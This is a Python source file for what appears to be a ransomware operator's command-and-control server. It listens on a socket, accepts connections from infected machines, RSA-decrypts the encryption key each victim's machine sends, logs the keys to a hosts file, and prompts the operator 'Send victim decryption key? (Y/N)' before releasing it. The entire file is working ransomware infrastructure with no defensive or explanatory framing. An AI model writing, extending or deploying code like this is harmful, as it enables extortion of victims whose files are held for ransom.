import socket
import rsa
import threading

IP_ADDRESS = '192.168.126.1'
PORT = 3000

with open("private.pem", "rb") as f:
    private_key = rsa.PrivateKey.load_pkcs1(f.read())

def handle_connection(connection, address):
    print(f"Connection from {address} established")
    with connection:
        while True:
            data_transmitted = connection.recv(1024)
            if not data_transmitted:
                break
            original_msg = rsa.decrypt(data_transmitted, private_key).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(original_msg + '\n')
                f.close()

            # Prompt the user for input (Y/N)
            response = input("Send victim decryption key? (Y/N): ")
            while response.upper() not in ['Y', 'N']:
                response = input("Invalid input. Please enter Y or N: ")

            if response.upper() == 'Y':
                print("Sending decryption key to user")
                connection.send(original_msg.encode('utf-8'))
            else:
                break   

    print(f"Connection from {address} closed")

def start_server():
    print("Creating socket...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((IP_ADDRESS, PORT))
        print("Socket created, listening for connections...")
        s.listen(5)
        while True:
            connection, address = s.accept()
            thread = threading.Thread(target=handle_connection, args=(connection, address))
            thread.start()

if __name__ == "__main__":
    start_server()